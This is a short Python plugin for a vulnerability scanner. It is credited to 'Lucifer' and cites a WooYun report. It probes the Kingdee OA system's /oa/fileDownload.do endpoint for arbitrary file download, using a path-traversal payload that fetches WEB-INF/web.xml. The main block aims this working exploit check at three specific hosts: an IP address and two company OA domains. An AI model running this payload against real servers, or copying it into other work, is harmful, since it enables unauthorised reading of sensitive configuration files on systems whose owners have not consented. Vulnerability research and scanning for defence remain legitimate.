#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金蝶办公系统任意文件下载
author: Lucifer
referer: http://www.wooyun.org/bugs/wooyun-2015-0150077
description: 金蝶协同办公系统/oa/fileDownload.do文件参数path未校验存在任意文件下载漏洞，导致泄露敏感信息
'''
import re

def assign(service, arg):
    if service == "jdeas":
        return True, arg

def audit(arg):
    url = arg + "oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and '<?xml version' in res:
        security_hole("file download Vulnerable: "+url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('jdeas', 'http://202.104.120.18:7890/')[1])
    audit(assign('jdeas', 'http://oa.jimbshoes.com/')[1])
    audit(assign('jdeas', 'http://oa.fghev.com:7890/')[1])